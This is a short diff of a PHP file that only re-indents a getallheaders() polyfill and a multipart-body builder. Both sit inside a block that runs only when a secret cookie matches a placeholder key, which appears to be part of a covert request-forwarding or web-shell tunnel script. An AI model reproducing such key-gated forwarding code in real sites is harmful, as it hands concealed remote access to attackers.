@@ -63,19 +63,19 @@ if (@$_COOKIE["_k"] == "INSERT_KEY") {
 		}
 
 		if (!function_exists("getallheaders"))  {
-    		function getallheaders()
-    		{
-    		    if (!is_array($_SERVER)) {
-    		        return array();
-    		    }
-    		    $headers = array();
-    		    foreach ($_SERVER as $name => $value) {
-    		        if (substr($name, 0, 5) == "HTTP_") {
-    		            $headers[str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($name, 5)))))] = $value;
-    		        }
-    		    }
-    		    return $headers;
-    		}
+			function getallheaders()
+			{
+			    if (!is_array($_SERVER)) {
+			        return array();
+			    }
+			    $headers = array();
+			    foreach ($_SERVER as $name => $value) {
+			        if (substr($name, 0, 5) == "HTTP_") {
+			            $headers[str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($name, 5)))))] = $value;
+			        }
+			    }
+			    return $headers;
+			}
 		}
 		function buildMultipart($boundary, $fields, $files) {
 	    	$data = '';
@@ -97,9 +97,9 @@ if (@$_COOKIE["_k"] == "INSERT_KEY") {
 	    	    $data .= $eol;
 	    	    $data .= file_get_contents($f["tmp_name"]) . $eol;
 	    	}
-	    	$data .= "--" . $delimiter . "--".$eol;
+			$data .= "--" . $delimiter . "--".$eol;
 
-	    	return $data;
+			return $data;
 		}
 		$assoc_headers = getallheaders();
 		if (strpos(@$assoc_headers["Content-Type"], "multipart/form-data") !== false) {
